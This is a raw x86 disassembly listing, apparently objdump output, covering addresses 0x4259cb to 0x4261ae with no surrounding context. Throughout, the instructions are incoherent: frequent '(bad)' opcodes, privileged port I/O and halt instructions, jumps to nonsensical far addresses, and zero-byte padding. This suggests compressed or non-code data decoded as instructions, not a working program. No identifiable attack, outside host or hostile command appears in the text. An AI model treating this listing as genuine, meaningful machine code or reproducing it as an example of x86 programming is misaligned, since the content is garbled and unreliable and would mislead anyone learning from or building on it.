  4259cb:	stos   DWORD PTR es:[edi],eax
  4259cc:	je     0x4259e5
  4259ce:	jmp    0x425953
  4259d0:	cmp    BYTE PTR [ebx-0x5e8fc818],bl
  4259d6:	fcom   QWORD PTR [ebx]
  4259d8:	clc    
  4259d9:	inc    edi
  4259da:	sub    eax,0x42327519
  4259df:	lea    esp,ss:[ecx+0x4265afd4]
  4259e6:	jmp    0xe944e2d9
  4259eb:	add    ebp,DWORD PTR [esi-0x79]
  4259ee:	in     al,dx
  4259ef:	lods   al,BYTE PTR ds:[esi]
  4259f0:	jle    0x425993
  4259f2:	and    al,BYTE PTR [esi+0x69]
  4259f5:	dec    esi
  4259f6:	retf   0x7503
  4259f9:	lods   eax,DWORD PTR ds:[esi]
  4259fa:	out    dx,al
  4259fb:	lock sub eax,0x6e010185
  425a01:	ja     0x425a2b
  425a03:	cmp    dh,ah
  425a05:	mov    ds:0x2750014,al
  425a0a:	retw   0x8b77
  425a0e:	xor    al,0xb0
  425a10:	push   edx
  425a11:	push   es
  425a12:	mov    ds:0xd2032e41,eax
  425a17:	xor    DWORD PTR ds:0x389aaa,esp
  425a1d:	add    BYTE PTR [eax],al
  425a1f:	add    BYTE PTR [eax],al
  425a21:	jne    0x425a25
  425a23:	sub    WORD PTR [ecx],sp
  425a26:	add    bl,BYTE PTR [edx]
  425a28:	dec    edx
  425a29:	stos   BYTE PTR es:[edi],al
  425a2a:	push   ss
  425a2b:	add    al,ah
  425a2d:	fist   WORD PTR [esi]
  425a2f:	hlt    
  425a30:	scas   al,BYTE PTR es:[edi]
  425a31:	rcl    BYTE PTR fs:[ecx],cl
  425a34:	sub    DWORD PTR [ecx-0x78],esi
  425a37:	inc    ebp
  425a38:	sahf   
  425a39:	xor    BYTE PTR [eax+0x14],ah
  425a3c:	jmp    0xe5a88f85
  425a41:	pop    ebp
  425a42:	adc    al,BYTE PTR [eax+0x26]
  425a45:	push   cs
  425a46:	adc    al,0xc0
  425a48:	xchg   ecx,eax
  425a49:	push   edi
  425a4a:	dec    esi
  425a4b:	add    cl,ch
  425a4d:	pop    ds
  425a4e:	adc    al,0xe0
  425a50:	sub    edi,0xfe9004d
  425a56:	aam    0xe7
  425a58:	jbe    0x425ac7
  425a5a:	add    al,BYTE PTR [eax]
  425a5c:	push   0xffffffb7
  425a5e:	add    eax,0x3cdbd44b
  425a63:	pop    edx
  425a64:	sub    al,BYTE PTR [edx-0x3b]
  425a67:	add    edi,DWORD PTR [ebp+0x13]
  425a6a:	inc    edx
  425a6b:	add    dl,bh
  425a6d:	mov    ebx,0x7e8e8933
  425a72:	mov    DWORD PTR [ebx-0xb],ebx
  425a75:	mov    bh,0x44
  425a77:	add    al,0x35
  425a79:	repz inc edx
  425a7b:	add    BYTE PTR [ecx-0x16bfcfba],al
  425a81:	fld    QWORD PTR [ebx+0x14]
  425a84:	jno    0x425a86
  425a86:	add    BYTE PTR [eax],al
  425a88:	add    BYTE PTR [eax],al
  425a8a:	scas   al,BYTE PTR es:[edi]
  425a8b:	dec    BYTE PTR [eax+0x5b8b569e]
  425a91:	int    0xc9
  425a93:	cmp    ebp,DWORD PTR [eax]
  425a95:	cdq    
  425a96:	xor    al,0x44
  425a98:	adc    dh,ah
  425a9a:	psadbw mm1,mm7
  425a9d:	sti    
  425a9e:	mov    dh,0x2
  425aa0:	lea    ebx,[esi+0x4d]
  425aa3:	pop    eax
  425aa4:	mov    ds:0xe80276e9,eax
  425aa9:	add    BYTE PTR [ebp-0x7a00084b],dl
  425aaf:	aam    0x23
  425ab1:	pop    esi
  425ab2:	xchg   ebp,eax
  425ab3:	dec    esp
  425ab4:	sub    dh,al
  425ab6:	pop    ebx
  425ab7:	or     al,BYTE PTR [ecx]
  425ab9:	(bad)  
  425aba:	dec    ebx
  425abb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425abc:	xor    eax,0x8303dc00
  425ac1:	(bad)  
  425ac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ac3:	(bad)  
  425ac4:	dec    edi
  425ac5:	mov    eax,DWORD PTR ds:0xcc000b7c
  425acb:	add    ebp,esi
  425acd:	inc    esp
  425ace:	mov    eax,0xda74009b
  425ad3:	xor    al,0xe8
  425ad5:	and    BYTE PTR [eax+0x6],ah
  425ad8:	add    BYTE PTR [ebx+0x4ba4c8b],cl
  425ade:	pushf  
  425adf:	xor    al,BYTE PTR [ebx+0x7b36edec]
  425ae5:	xor    BYTE PTR gs:[ebx],al
  425ae8:	jnp    0x425b69
  425aea:	mov    al,ds:0xc74e03
  425aef:	add    BYTE PTR [eax],al
  425af1:	add    BYTE PTR [eax],al
  425af3:	fwait
  425af4:	daa    
  425af5:	add    BYTE PTR [eax-0x64],0xd1
  425af9:	dec    edx
  425afa:	push   ebx
  425afb:	pop    ss
  425afc:	inc    esp
  425afd:	or     BYTE PTR [ebx+0x348d67c1],cl
  425b03:	in     al,0x20
  425b05:	(bad)  
  425b06:	xor    ah,BYTE PTR [edi+0xa0853ae]
  425b0c:	or     eax,0x20745d89
  425b11:	inc    eax
  425b12:	add    al,0x5f
  425b14:	inc    edx
  425b15:	clc    
  425b16:	call   0x39c74c
  425b1b:	xlat   BYTE PTR ds:[ebx]
  425b1c:	add    DWORD PTR [ebx+0x45],edi
  425b1f:	push   esp
  425b20:	out    0x3a,al
  425b22:	cmp    esi,DWORD PTR [esi+ebx*4+0x2475e96d]
  425b29:	out    dx,al
  425b2a:	test   BYTE PTR [ebx],ch
  425b2c:	xor    eax,0xada3fb10
  425b31:	rol    BYTE PTR [edx],0x3d
  425b34:	adc    eax,DWORD PTR [eax+eax*1+0x1d]
  425b38:	ins    BYTE PTR es:[edi],dx
  425b39:	cmp    eax,0x9bf77500
  425b3e:	mov    ebp,0xfaffa9ae
  425b43:	cmp    BYTE PTR [ebp+0x7d],bh
  425b46:	inc    ebp
  425b47:	jmp    0x674e9bff
  425b4c:	loopne 0x425b9a
  425b4e:	lea    esp,[edx-0x5b]
  425b51:	xchg   edi,eax
  425b52:	cs stc 
  425b54:	push   ds
  425b55:	test   eax,0xfb
  425b5a:	add    BYTE PTR [eax],al
  425b5c:	inc    edx
  425b5d:	mov    eax,ds:0x757943c0
  425b62:	jp     0x425ba4
  425b64:	jne    0x425b97
  425b66:	mov    al,BYTE PTR [edi+0x75]
  425b69:	test   eax,0xbd6903c0
  425b6e:	aas    
  425b6f:	add    BYTE PTR [ebx-0x1e],al
  425b72:	les    edx,FWORD PTR [ebp-0x12]
  425b75:	xor    al,0x4f
  425b77:	xor    WORD PTR [ecx],0x471e
  425b7c:	jne    0x425b27
  425b7e:	jp     0x425b40
  425b80:	or     DWORD PTR [esp+eax*4-0x7b568ea0],edi
  425b87:	pusha  
  425b88:	jge    0x425b35
  425b8a:	rol    BYTE PTR [eax],0x3d
  425b8d:	and    al,BYTE PTR [eax+eax*1-0x14]
  425b91:	mov    ds:0x1b2871e7,ax
  425b97:	cld    
  425b98:	jne    0x425bc2
  425b9a:	and    edi,esp
  425b9c:	jne    0x425c1b
  425b9e:	sub    esp,DWORD PTR [eax-0x12]
  425ba1:	repz mov WORD PTR fs:[ecx+0x2],?
  425ba6:	ins    BYTE PTR es:[edi],dx
  425ba7:	push   DWORD PTR [edx]
  425ba9:	sahf   
  425baa:	jmp    0x394d0225
  425baf:	pushf  
  425bb0:	dec    ecx
  425bb1:	dec    ecx
  425bb2:	jmp    0x3e054cba
  425bb7:	fdivr  st,st(3)
  425bb9:	or     al,0x4f
  425bbb:	add    al,bh
  425bbd:	inc    edi
  425bbe:	mov    ch,0x53
  425bc0:	add    BYTE PTR [eax],al
  425bc2:	add    BYTE PTR [eax],al
  425bc4:	add    dl,bh
  425bc6:	inc    ebp
  425bc7:	fnsave [esi+0x71]
  425bca:	cmp    DWORD PTR [ecx],0xffffffa9
  425bcd:	mov    BYTE PTR [esi-0xd],cl
  425bd0:	inc    ebx
  425bd1:	jne    0x425b5c
  425bd3:	sub    bh,al
  425bd5:	sti    
  425bd6:	or     al,0x66
  425bd8:	mov    edi,0x82f58f69
  425bdd:	xor    eax,0xf1f8228b
  425be2:	retf   
  425be3:	std    
  425be4:	call   DWORD PTR [edx]
  425be6:	add    al,0x7e
  425be8:	or     dl,dh
  425bea:	inc    edi
  425beb:	gs jl  0x425b93
  425bee:	xchg   DWORD PTR [ecx],ebp
  425bf0:	das    
  425bf1:	sbb    DWORD PTR [ebp+0x2b7ffdb],0x2357d21
  425bfb:	push   ecx
  425bfc:	std    
  425bfd:	cmp    eax,DWORD PTR [edx]
  425bff:	jmp    0x9e48f955
  425c04:	add    esi,DWORD PTR [ebp-0x30]
  425c07:	sub    BYTE PTR [ecx-0x54],cl
  425c0a:	sar    DWORD PTR [esp+edi*2+0x170d8161],0xf2
  425c12:	dec    esi
  425c13:	in     eax,0x54
  425c15:	(bad)  
  425c16:	xor    eax,0x26a1401
  425c1b:	jmp    0x64dd149a
  425c20:	ret    
  425c21:	jle    0x425baf
  425c23:	add    BYTE PTR [edx+0x77],bl
  425c26:	add    al,BYTE PTR [eax]
  425c28:	bound  eax,QWORD PTR [eax]
  425c2a:	add    BYTE PTR [eax],al
  425c2c:	add    BYTE PTR [eax],al
  425c2e:	jnp    0x425c3a
  425c30:	jg     0x425c93
  425c32:	sub    eax,0xab6b0b02
  425c37:	add    eax,DWORD PTR [eax]
  425c39:	jmp    0xe9da8335
  425c3e:	daa    
  425c3f:	pop    ebp
  425c40:	lea    eax,[ebp+edi*8+0x64]
  425c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c45:	push   ebx
  425c46:	mov    eax,ds:0xa12c8d65
  425c4b:	and    al,0x0
  425c4d:	sbb    ecx,ebx
  425c4f:	pop    ecx
  425c50:	cmp    eax,ebp
  425c52:	jbe    0x425c71
  425c54:	(bad)  
  425c55:	in     eax,dx
  425c56:	sub    BYTE PTR [edi-0x5],al
  425c59:	jmp    0xe942f5ad
  425c5e:	jbe    0x425bf9
  425c60:	jne    0x425c57
  425c62:	dec    edi
  425c63:	inc    edi
  425c64:	clc    
  425c65:	xchg   ecx,eax
  425c66:	xchg   esi,eax
  425c67:	in     al,dx
  425c68:	(bad)  
  425c69:	call   0x6e8faf39
  425c6e:	cmp    al,0x16
  425c70:	lea    eax,[ecx+0x29850030]
  425c76:	mov    ds:0x76e83c80,al
  425c7b:	add    al,BYTE PTR [edi+0x7c8ecea4]
  425c81:	je     0x425cb4
  425c83:	popf   
  425c84:	mov    ebx,0x740109b0
  425c89:	push   es
  425c8a:	inc    eax
  425c8b:	push   ss
  425c8c:	push   ds
  425c8d:	mov    al,ds:0xdffad345
  425c92:	add    BYTE PTR [eax],al
  425c94:	add    BYTE PTR [eax],al
  425c96:	add    BYTE PTR [ebx],bl
  425c98:	test   bl,0xf5
  425c9b:	mov    dh,0x2
  425c9d:	xchg   edi,ebp
  425c9f:	imul   edx,DWORD PTR [ecx+0x0],0xffffffca
  425ca3:	aaa    
  425ca4:	xor    edi,ebx
  425ca6:	add    BYTE PTR [ecx],dh
  425ca8:	rcl    BYTE PTR [eax+eax*2],0x5c
  425cac:	sbb    DWORD PTR [esi],eax
  425cae:	and    ecx,DWORD PTR [edi+0x770188fc]
  425cb4:	lock div BYTE PTR [esi]
  425cb7:	sbb    esi,ebx
  425cb9:	ret    
  425cba:	adc    al,0x5c
  425cbc:	push   es
  425cbd:	jecxz  0x425cc7
  425cbf:	dec    ebx
  425cc0:	scas   al,BYTE PTR es:[edi]
  425cc1:	not    BYTE PTR ds:0x400bcc
  425cc7:	pushf  
  425cc8:	jmp    0x37f6:0xa54000f6
  425ccf:	retf   
  425cd0:	ror    BYTE PTR [ebx],cl
  425cd2:	inc    DWORD PTR [edx]
  425cd4:	gs adc eax,0x3ff258
  425cda:	adc    DWORD PTR [eax],0xffffff94
  425cdd:	test   al,al
  425cdf:	sbb    DWORD PTR [ecx-0x4a0bc90a],0x80dc0045
  425ce9:	push   ds
  425cea:	add    BYTE PTR [edi-0x44],bl
  425ced:	sti    
  425cee:	std    
  425cef:	xchg   ecx,eax
  425cf0:	arpl   WORD PTR [eax+0x69b4b7d],ax
  425cf6:	add    dh,0x64
  425cf9:	idiv   edi
  425cfb:	add    BYTE PTR [eax],al
  425cfd:	add    BYTE PTR [eax],al
  425cff:	add    BYTE PTR [ecx],bl
  425d01:	rcl    BYTE PTR [edi-0x6c2e39],cl
  425d07:	dec    DWORD PTR [edi+edi*8-0x40def97e]
  425d0e:	je     0x425d6c
  425d10:	sbb    ebp,esp
  425d12:	das    
  425d13:	mov    ebp,ebx
  425d15:	pop    edi
  425d16:	dec    edi
  425d17:	shl    DWORD PTR [edi],1
  425d19:	xor    BYTE PTR [eax+0x6a],dl
  425d1c:	pop    esp
  425d1d:	ja     0x425d94
  425d1f:	out    dx,eax
  425d20:	mov    esp,DWORD PTR [ecx+ecx*4+0x47]
  425d24:	jne    0x425d1f
  425d26:	jg     0x425ce8
  425d28:	loopne 0x425cd1
  425d2a:	in     al,0x2
  425d2c:	inc    dl
  425d2e:	jbe    0x425cef
  425d30:	lock fild QWORD PTR [ebx]
  425d33:	pop    es
  425d34:	out    dx,al
  425d35:	jecxz  0x425ccd
  425d37:	add    ah,BYTE PTR [edi-0x57]
  425d3a:	inc    DWORD PTR [ebp+esi*1+0x3c2f1021]
  425d41:	les    edi,FWORD PTR es:[edx+0x4d]
  425d45:	dec    ebx
  425d46:	cmp    DWORD PTR [edx+ebp*4],0xb4032d4c
  425d4d:	add    BYTE PTR [esp+edi*2-0x72f94fff],bh
  425d54:	cmp    ecx,0x4c
  425d57:	dec    edi
  425d58:	cli    
  425d59:	xchg   edx,eax
  425d5a:	pop    ss
  425d5b:	jmp    0xe8420650
  425d60:	mov    eax,ds:0xfba58c
  425d65:	add    BYTE PTR [eax],al
  425d67:	add    BYTE PTR [eax],al
  425d69:	in     al,dx
  425d6a:	jmp    0x20fd:0xf5b58543
  425d71:	jp     0x425d9b
  425d73:	mov    edx,0xf7edca04
  425d78:	je     0x425d65
  425d7a:	pop    ds
  425d7b:	cmp    ecx,DWORD PTR [eax]
  425d7d:	out    dx,al
  425d7e:	loopne 0x425d77
  425d80:	xchg   BYTE PTR ds:0xfd7c7891,dh
  425d86:	cmp    al,0x79
  425d88:	inc    ebx
  425d89:	ins    DWORD PTR es:[edi],dx
  425d8a:	imul   ebx,DWORD PTR [eax],0x2d3e15c0
  425d90:	add    al,0x25
  425d92:	xor    ebx,esi
  425d94:	dec    eax
  425d95:	jne    0x425d40
  425d97:	jnp    0x425d59
  425d99:	or     DWORD PTR [ebx],eax
  425d9b:	push   ss
  425d9c:	pusha  
  425d9d:	call   0xfe92e507
  425da2:	add    ch,BYTE PTR [edx-0x763d2c05]
  425da8:	add    BYTE PTR [edi+0x32],dh
  425dab:	adc    cl,BYTE PTR [edi]
  425dad:	test   eax,0xfa03a8f0
  425db2:	inc    ecx
  425db3:	icebp  
  425db4:	js     0x425df3
  425db6:	xor    BYTE PTR cs:[edx+eax*8],ah
  425dba:	mov    esi,0x876f00e5
  425dbf:	test   eax,0xf141fc02
  425dc4:	das    
  425dc5:	jno    0x425e19
  425dc7:	call   0x2cc9d964
  425dcc:	mov    WORD PTR [eax],es
  425dce:	add    BYTE PTR [eax],al
  425dd0:	add    BYTE PTR [eax],al
  425dd2:	or     eax,0xea4cd7d
  425dd7:	aad    0xa8
  425dd9:	inc    esp
  425dda:	scas   eax,DWORD PTR es:[edi]
  425ddb:	cmp    eax,0x26dc1b0
  425de0:	aas    
  425de1:	or     BYTE PTR [ebp+0x75413592],cl
  425de7:	stos   BYTE PTR es:[edi],al
  425de8:	gs out 0x75,eax
  425deb:	add    ah,BYTE PTR [esi+0x1e]
  425dee:	loope  0x425df2
  425df0:	pushw  ds
  425df2:	aad    0x2
  425df4:	pop    esi
  425df5:	ds jge 0x425d85
  425df8:	xor    al,0xa4
  425dfa:	or     BYTE PTR [edx-0x13],0xf4
  425dfe:	inc    ebx
  425dff:	shr    cl,0x3
  425e02:	jne    0x425d91
  425e04:	sub    esp,edi
  425e06:	add    edi,edi
  425e08:	jo     0x425e84
  425e0a:	xor    BYTE PTR [esi+0xfecae16],ch
  425e10:	xor    eax,0xa08d6d78
  425e15:	sti    
  425e16:	std    
  425e17:	inc    edi
  425e18:	and    DWORD PTR [esi-0x44],edi
  425e1b:	or     DWORD PTR [ebp-0x76],esp
  425e1e:	jne    0x425e22
  425e20:	add    cl,ch
  425e22:	lea    ecx,[esi]
  425e24:	fcomp  st(6)
  425e26:	cmc    
  425e27:	add    DWORD PTR [eax],0x8176e9
  425e2d:	xchg   edx,eax
  425e2e:	adc    BYTE PTR [edx],ah
  425e30:	call   FWORD PTR [eax+0x645c35a]
  425e36:	add    BYTE PTR [eax],al
  425e38:	add    BYTE PTR [eax],al
  425e3a:	add    BYTE PTR [esi-0x7e],dh
  425e3d:	jge    0x425e4d
  425e3f:	dec    edx
  425e40:	sub    BYTE PTR [ebp-0x12],bl
  425e43:	rcl    BYTE PTR [edi],1
  425e45:	jecxz  0x425ea9
  425e47:	mov    dl,0x5c
  425e49:	adc    BYTE PTR [ebp+edi*1+0x1c],ah
  425e4d:	push   cs
  425e4e:	out    0x4d,al
  425e50:	pop    ebx
  425e51:	sti    
  425e52:	push   esp
  425e53:	sub    DWORD PTR [eax-0x4a311abb],eax
  425e59:	dec    ecx
  425e5a:	jmp    0x3d02ddd5
  425e5f:	sub    al,BYTE PTR [eax+0x7e297f5c]
  425e65:	xlat   BYTE PTR ds:[ebx]
  425e66:	aaa    
  425e67:	add    bl,BYTE PTR [esp+esi*2+0x759bd96f]
  425e6e:	stc    
  425e6f:	sti    
  425e70:	ds or  al,0x91
  425e73:	mov    eax,0xede9004a
  425e78:	shl    DWORD PTR [ebp-0x37],0x3
  425e7c:	ss mov edx,0x7ab0fc19
  425e82:	ficom  DWORD PTR [edi]
  425e84:	push   cs
  425e85:	mov    edx,0x100f1629
  425e8a:	bound  edi,QWORD PTR [esi+eax*1]
  425e8d:	call   0x449721
  425e92:	fs mov ecx,0x2c57050e
  425e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e99:	out    0x88,eax
  425e9b:	stc    
  425e9c:	push   ss
  425e9d:	jecxz  0x425e9f
  425e9f:	add    BYTE PTR [eax],al
  425ea1:	add    BYTE PTR [eax],al
  425ea3:	add    BYTE PTR [eax-0x3674f910],bl
  425ea9:	pop    eax
  425eaa:	mov    DWORD PTR ds:[ecx-0x77ba7ca8],edi
  425eb1:	outs   dx,DWORD PTR gs:[esi]
  425eb3:	call   DWORD PTR [ebx-0x4bba7c9d]
  425eb9:	mov    ch,0x44
  425ebb:	fdiv   st(1),st
  425ebd:	or     edi,DWORD PTR [ebx+0x4d]
  425ec0:	and    BYTE PTR [ebx-0x50],0x1
  425ec4:	addr16 cdq 
  425ec6:	test   BYTE PTR [ebp+0x6c],0x65
  425eca:	sub    bh,bh
  425ecc:	inc    ebx
  425ecd:	gs sub eax,eax
  425ed0:	fadd   st(0),st
  425ed2:	and    DWORD PTR [ebp+0x44],0xffffff81
  425ed6:	dec    ebp
  425ed7:	cld    
  425ed8:	inc    ebx
  425ed9:	scas   al,BYTE PTR es:[edi]
  425eda:	mov    ebx,0xb813e8
  425edf:	add    dh,bl
  425ee1:	pop    es
  425ee2:	add    BYTE PTR [ebp-0x79],dl
  425ee5:	addr16 jnp 0x425ed4
  425ee8:	push   eax
  425ee9:	jg     0x425f50
  425eeb:	cld    
  425eec:	or     al,0xd1
  425eee:	dec    ebp
  425eef:	push   edi
  425ef0:	and    edi,ebx
  425ef2:	or     ecx,DWORD PTR [ebp-0x17af9d67]
  425ef8:	pop    esi
  425ef9:	xor    al,0xf7
  425efb:	dec    DWORD PTR [eax-0x3d]
  425efe:	pop    es
  425eff:	test   ah,dh
  425f01:	add    eax,DWORD PTR [eax]
  425f03:	add    BYTE PTR [ecx+0x4a],al
  425f06:	cld    
  425f07:	push   eax
  425f08:	add    BYTE PTR [eax],al
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	add    ah,ah
  425f0e:	mov    ds:0x8a43ff4b,al
  425f13:	ror    BYTE PTR [edi],0x19
  425f16:	pop    esp
  425f17:	add    BYTE PTR [eax],al
  425f19:	pushf  
  425f1a:	mov    eax,DWORD PTR [ebp+0xf]
  425f1d:	adc    DWORD PTR [edx-0x48],ecx
  425f20:	push   eax
  425f21:	jne    0x425f41
  425f23:	dec    eax
  425f24:	cld    
  425f25:	and    eax,0x8a508041
  425f2a:	inc    eax
  425f2b:	mov    al,al
  425f2d:	jb     0x425f4d
  425f2f:	jge    0x425f31
  425f31:	jne    0x425edc
  425f33:	mov    cl,BYTE PTR [ebp+0x45]
  425f36:	and    al,0x48
  425f38:	aam    0xf4
  425f3a:	jmp    0xf8a55a3d
  425f3f:	adc    eax,0xbbf265a
  425f45:	cli    
  425f46:	sub    edi,edi
  425f48:	push   DWORD PTR [ebp+0x1b]
  425f4b:	pop    es
  425f4c:	cmp    DWORD PTR [ecx+ebp*4],0x18759b9e
  425f53:	sbb    al,0x8d
  425f55:	mov    eax,0xcfe82ea5
  425f5a:	fisub  DWORD PTR [eax+0x1368f8fb]
  425f60:	ins    BYTE PTR es:[edi],dx
  425f61:	sbb    dh,BYTE PTR [esi]
  425f63:	mov    ah,0xe8
  425f65:	(bad)
  425f68:	add    dh,bh
  425f6a:	pusha  
  425f6b:	adc    edi,0xffffff89
  425f6e:	call   0x42dcff
  425f73:	add    BYTE PTR [eax],al
  425f75:	add    BYTE PTR ds:0x75b89524,ah
  425f7b:	mov    ecx,0x61aeffff
  425f80:	mov    ecx,DWORD PTR [ebp-0x23]
  425f83:	fst    DWORD PTR [eax]
  425f85:	inc    edx
  425f86:	mov    dl,0xd8
  425f88:	xor    eax,0x3485388d
  425f8d:	call   0xfbe359a3
  425f92:	clc    
  425f93:	push   0x96762313
  425f98:	xchg   edi,eax
  425f99:	daa    
  425f9a:	xor    BYTE PTR [ecx],dl
  425f9c:	xlat   BYTE PTR ds:[ebx]
  425f9d:	inc    esp
  425f9e:	lods   eax,DWORD PTR ds:[esi]
  425f9f:	add    ebx,esp
  425fa1:	pop    es
  425fa2:	clc    
  425fa3:	xchg   esi,eax
  425fa4:	aam    0xb7
  425fa6:	push   edx
  425fa7:	xchg   ebx,eax
  425fa8:	push   ss
  425fa9:	(bad)  
  425faa:	cld    
  425fab:	or     al,0x55
  425fad:	xchg   DWORD PTR [ebp+0x3239f40c],esi
  425fb3:	xchg   edi,eax
  425fb4:	mov    ah,0xb
  425fb6:	(bad)  
  425fb7:	aam    0x32
  425fb9:	mov    eax,ds:0x10a48b6e
  425fbe:	mov    edx,0x75489eaa
  425fc3:	add    ch,BYTE PTR [edi+eax*2+0x59]
  425fc7:	xor    eax,DWORD PTR [ecx]
  425fc9:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fcb:	xchg   ebp,eax
  425fcc:	or     al,BYTE PTR [eax+ecx*8+0x6416e905]
  425fd3:	xchg   DWORD PTR [edi+ebx*4+0x513baaa5],esp
  425fda:	add    BYTE PTR [eax],al
  425fdc:	add    BYTE PTR [eax],al
  425fde:	add    BYTE PTR [esi],ch
  425fe0:	xchg   esi,eax
  425fe1:	les    edi,FWORD PTR fs:[esi+0x7e]
  425fe5:	sub    DWORD PTR [ecx+0x1e66961e],esp
  425feb:	sbb    DWORD PTR [ebx],eax
  425fed:	pop    ebp
  425fee:	or     eax,DWORD PTR [eax]
  425ff0:	inc    eax
  425ff1:	int    0x33
  425ff3:	sbb    eax,0xfea131e5
  425ff8:	mov    BYTE PTR [ecx+edx*1],ah
  425ffb:	adc    dh,ah
  425ffd:	gs push ds
  425fff:	icebp  
  426000:	add    dh,BYTE PTR ds:0xa53ff80b
  426006:	xor    ecx,ebp
  426008:	clc    
  426009:	sub    DWORD PTR [ecx+0x40a8d0de],esp
  42600f:	das    
  426010:	cmp    DWORD PTR [eax+0x1c027dc5],esp
  426016:	(bad)  
  426017:	rol    DWORD PTR [ecx+0x2c2a0f8d],1
  42601d:	add    BYTE PTR [esi],bl
  42601f:	enter  0x5398,0x16
  426023:	pop    ebx
  426024:	xchg   ebp,eax
  426025:	push   edx
  426026:	shr    DWORD PTR [ebp+0x2a],cl
  426029:	add    cl,ch
  42602b:	jbe    0x425faf
  42602d:	sti    
  42602e:	fadd   QWORD PTR [edx+0x6b60d87d]
  426034:	call   0xa915:0x99e2c489
  42603b:	adc    ch,0xff
  42603e:	pop    edi
  42603f:	mov    ebx,0x317f8e
  426044:	add    BYTE PTR [eax],al
  426046:	add    BYTE PTR [eax],al
  426048:	adc    eax,0xf3b92f0e
  42604d:	ds hlt 
  42604f:	mov    ecx,0x17fa970e
  426054:	adc    eax,0xb094c07e
  426059:	cdq    
  42605a:	jne    0x426059
  42605c:	loop   0x42604c
  42605e:	add    ebx,edx
  426060:	mov    dh,0x2
  426062:	cmp    DWORD PTR [edx+edx*1+0xe],esi
  426066:	or     esi,ebp
  426068:	adc    BYTE PTR [esi+0x4aafcfb],0x40
  42606f:	jmp    0x5e3a76ad
  426074:	sbb    BYTE PTR [ecx-0x11152e8b],0x3
  42607b:	fidiv  DWORD PTR [esi-0x22c3c6fe]
  426081:	or     eax,0x8e946a0b
  426086:	sti    
  426087:	xor    eax,0x9d759978
  42608c:	add    ch,bh
  42608e:	add    edi,edx
  426090:	add    ch,BYTE PTR ss:[esi]
  426093:	test   eax,0xa0573892
  426098:	mov    bh,0x9
  42609a:	add    BYTE PTR [eax],al
  42609c:	inc    edi
  42609d:	inc    ecx
  42609e:	and    BYTE PTR [ebx+0x400a0d01],cl
  4260a4:	pushf  
  4260a5:	test   DWORD PTR [ebp+0xc],eax
  4260a8:	in     eax,0xe1
  4260aa:	sti    
  4260ab:	je     0x4260ad
  4260ad:	add    BYTE PTR [eax],al
  4260af:	add    BYTE PTR [eax],al
  4260b1:	xchg   ecx,eax
  4260b2:	jae    0x426129
  4260b4:	cld    
  4260b5:	cmp    ecx,DWORD PTR [edi+esi*8+0x75]
  4260b9:	cwde   
  4260ba:	retf   
  4260bb:	dec    esi
  4260bc:	push   0xffffff90
  4260be:	jae    0x426135
  4260c0:	clc    
  4260c1:	cmp    ebx,DWORD PTR [ebx+0xcc1293]
  4260c7:	mov    DWORD PTR [ebp-0x58],eax
  4260ca:	mov    bh,0xbe
  4260cc:	je     0x4260c2
  4260ce:	jae    0x42613b
  4260d0:	and    BYTE PTR [esi*2-0x5c7bf78b],bl
  4260d7:	cld    
  4260d8:	jmp    FWORD PTR [ebx+0x73]
  4260db:	jne    0x4260d9
  4260dd:	(bad)  
  4260de:	push   esi
  4260df:	not    esi
  4260e1:	(bad)  
  4260e2:	mov    ecx,0xc12ff
  4260e7:	cmp    DWORD PTR [ebp+0x24],edi
  4260ea:	in     al,dx
  4260eb:	add    al,0xff
  4260ed:	mov    eax,ds:0x55d6f777
  4260f2:	loope  0x4260e7
  4260f4:	je     0x42611d
  4260f6:	cmp    DWORD PTR [ebp-0xc],0xff04ec2b
  4260fd:	mov    eax,ds:0x86d6f77a
  426102:	shl    bl,0x95
  426105:	(bad)  
  426106:	retf   
  426107:	xor    cl,0x2b
  42610a:	fwait
  42610b:	jmp    0x42611f
  42610d:	pushf  
  42610e:	inc    BYTE PTR [edx+0x2ab207f8]
  426114:	rol    BYTE PTR [eax],0x0
  426117:	add    BYTE PTR [eax],al
  426119:	add    BYTE PTR [edi+ecx*2+0x647585e0],cl
  426120:	adc    ebp,DWORD PTR [ecx]
  426122:	push   ebx
  426123:	mov    ah,0x5d
  426125:	leave  
  426126:	lock jecxz 0x426116
  426129:	popa   
  42612a:	imul   BYTE PTR [edx+0x44]
  42612d:	push   eax
  42612e:	sbb    esp,DWORD PTR [edx]
  426130:	pop    es
  426131:	sti    
  426132:	adc    BYTE PTR [ecx],0xf1
  426135:	aas    
  426136:	jne    0x426160
  426138:	xchg   edi,eax
  426139:	jmp    DWORD PTR [esi]
  42613b:	or     bh,BYTE PTR [edi-0x8]
  42613e:	jns    0x4260f5
  426140:	sti    
  426141:	jle    0x4260d0
  426143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426144:	sbb    BYTE PTR ds:0x7cef633d,al
  42614a:	rol    DWORD PTR [si+0x10],cl
  42614e:	call   FWORD PTR [edx-0x11]
  426151:	jg     0x4261bf
  426153:	scas   eax,DWORD PTR es:[edi]
  426154:	sbb    edi,DWORD PTR [edi+0x5a39e9a7]
  42615a:	aaa    
  42615b:	popf   
  42615c:	inc    DWORD PTR [esi-0x72f43a47]
  426162:	mov    ebx,0x79488c97
  426167:	push   cs
  426168:	dec    ebp
  426169:	sbb    al,0x86
  42616b:	mov    eax,ebp
  42616d:	inc    eax
  42616e:	jge    0x426116
  426170:	(bad)  
  426171:	push   DWORD PTR [ebp+0x50]
  426174:	int    0x75
  426176:	js     0x42618a
  426178:	adc    al,0x14
  42617a:	push   cs
  42617b:	cld    
  42617c:	xchg   BYTE PTR [eax+0x0],cl
  42617f:	add    BYTE PTR [eax],al
  426181:	add    BYTE PTR [eax],al
  426183:	and    DWORD PTR [eax],0x57460847
  426189:	fxch   st(1)
  42618b:	mov    DWORD PTR [edx-0x31bbc6db],edi
  426191:	add    al,0x3e
  426193:	pop    ebx
  426194:	xchg   edx,eax
  426195:	push   cs
  426196:	(bad)  
  426197:	data16 sahf 
  426199:	add    cl,0x77
  42619c:	add    cl,BYTE PTR [esi-0x6ce1353]
  4261a2:	les    esi,FWORD PTR ds:0x7503e7ee
  4261a8:	add    bl,BYTE PTR [ecx+0x3]
  4261ab:	ficom  DWORD PTR [eax+0x1c]
  4261ae:	mov    ecx,ecx
